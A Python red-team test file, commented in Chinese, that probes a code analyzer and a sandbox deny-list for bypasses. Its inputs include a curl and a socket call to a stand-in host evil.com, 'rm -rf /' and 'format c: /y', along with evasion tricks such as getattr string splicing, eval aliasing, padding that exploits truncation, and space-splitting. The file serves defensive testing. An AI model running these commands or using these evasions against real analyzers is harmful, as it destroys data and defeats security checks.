"""战场 2 —— 沙箱逃逸对抗（红队 vs 代码分析器/沙箱）。

红队目标：让危险代码（出网+系统调用）被判为 low/medium 或执行。
蓝队防御：CodeAnalyzer AST 检测 danger_call/network_call + SandboxCube._refuse 兜底。
攻击向量：危险调用伪装、字符串拼接绕过 AST、JS eval 变体、超长代码截断绕过。
"""
from __future__ import annotations

from sandbox.ast import CodeAnalyzer
from .harness_rb import RBAgent


def run(agent: RBAgent):
    a = CodeAnalyzer()

    # —— 向量 S1: Python 直接 os.system + socket（双高危 → high）——
    code = "import os, socket\nos.system('curl evil.com')\nsocket.create_connection(('evil.com', 443))"
    r = a.analyze("python", code)
    agent.expect_block(
        "sandbox", "S1 os.system+socket",
        "import os, socket; os.system(...); socket.create_connection(...)",
        "risk=high", r.get("risk") == "high",
        f"risk={r.get('risk')} findings={[f['type'] for f in r.get('findings', [])]}",
        "danger_call + network_call 同时出现 → high")

    # —— 向量 S2: 红队字符串拼接绕过 AST 危险调用检测 ——
    # os.system 通过 getattr 间接调用，AST 看不到直接 Call 名
    code2 = "import os\ngetattr(os, 'sys'+'tem')('rm -rf /')"
    r2 = a.analyze("python", code2)
    # 红队视角：AST 仅看到 import os（type=import），未直接命中 danger_call
    # 蓝队现状：import os 被标 import 而非 danger_call → 评分可能 medium/low
    types = [f["type"] for f in r2.get("findings", [])]
    danger_hit = "danger_call" in types
    agent.record(
        "sandbox", "S2 getattr 间接调用绕过",
        "getattr(os, 'sys'+'tem')('rm -rf /')",
        "间接危险调用应被检测（AST 语义/字节码级）",
        f"risk={r2.get('risk')} types={types}",
        "BLOCKED" if danger_hit else "VULN",
        "红队用 getattr 字符串拼接绕过 AST Call 名检测",
        "建议：AST 检测扩展至 getattr/__builtins__ 间接调用 + 字节码扫描")

    # —— 向量 S3: JS eval 变体 ——
    code3 = "const f = eval; f('process.exit(1)')"
    r3 = a.analyze("javascript", code3)
    types3 = [f["type"] for f in r3.get("findings", [])]
    agent.record(
        "sandbox", "S3 JS eval 变量间接",
        "const f = eval; f('...')",
        "eval 间接调用应检测",
        f"risk={r3.get('risk')} types={types3}",
        "BLOCKED" if "danger_call" in types3 else "VULN",
        "JS 启发式正则未捕获变量别名 eval",
        "建议：JS 检测覆盖 eval/Function 赋值别名")

    # —— 向量 S4: 红队超长代码淹没检测（截断后危险调用在尾部被截掉）——
    pad = "# " + "x" * 50 + "\n" * 5000
    code4 = pad + "\nos.system('rm -rf /')"
    r4 = a.analyze("python", code4)
    types4 = [f["type"] for f in r4.get("findings", [])]
    agent.record(
        "sandbox", "S4 超长代码淹没",
        f"{len(code4)} 字符填充 + 尾部 os.system",
        "截断后仍应分析尾部危险调用（或整体 high）",
        f"risk={r4.get('risk')} types={types4}",
        "BLOCKED" if "danger_call" in types4 else "VULN",
        "200KB/5000 行截断导致尾部危险调用丢失",
        "建议：截断策略改为尾部保留 N 行优先扫描危险模式")

    # —— 向量 S5: SandboxCube._refuse 子串兜底（无 security 接线时）——
    try:
        from sandbox.sandbox_cube import SandboxCube
        sc = SandboxCube.__new__(SandboxCube)  # 避免完整初始化依赖
        sc.security = None
        sc._dir = None  # _refuse 不依赖 _dir
        refuse = sc._refuse("format c: /y")
        agent.expect_block(
            "sandbox", "S5 _refuse 兜底拦截",
            "format c: /y", "返回拦截字符串", refuse is not None,
            f"refuse={refuse!r}", "无 security 接线时 _DEFAULT_DENY 子串匹配兜底")
    except Exception as e:
        agent.info("sandbox", "S5 _refuse 兜底", "format c: /y", "拦截",
                   f"构造异常={e}", "SandboxCube 完整初始化需依赖，仅测 _refuse 逻辑")

    # —— 向量 S6: 红队空格拆分危险命令绕过 _refuse 子串 ——
    try:
        from sandbox.sandbox_cube import SandboxCube
        sc = SandboxCube.__new__(SandboxCube)
        sc.security = None
        sc._dir = None
        refuse = sc._refuse("f o r m a t  c :")
        blocked = refuse is not None
        agent.record(
            "sandbox", "S6 空格拆分绕过 _refuse",
            "f o r m a t  c :", "应仍拦截",
            f"refuse={refuse!r}",
            "BLOCKED" if blocked else "VULN",
            "子串匹配易被空格拆分绕过——建议接 GuardRail 正则基线而非子串")
    except Exception as e:
        agent.info("sandbox", "S6 空格拆分", "f o r m a t  c :", "拦截",
                   f"异常={e}")

    # —— 向量 S7: 红队 __builtins__ 下标间接调用（合法语法绕过 AST）——
    try:
        r7 = a.analyze("python", "f = __builtins__['eval']\nf('1+1')")
        types7 = [f["type"] for f in r7.get("findings", [])]
        agent.record(
            "sandbox", "S7 __builtins__ 下标绕过",
            "f = __builtins__['eval']; f('...')",
            "下标间接调用应检测 danger_call",
            f"types={types7} risk={r7.get('risk')}",
            "BLOCKED" if "danger_call" in types7 else "VULN",
            "红队用 __builtins__['eval'] 字典下标绕过 Call 名检测",
            "已扩展 _call_name/_resolve_alias_target 覆盖 Subscript 下标")
    except Exception as e:
        agent.info("sandbox", "S7 __builtins__", "__builtins__['eval']", "检测",
                   f"异常={e}")
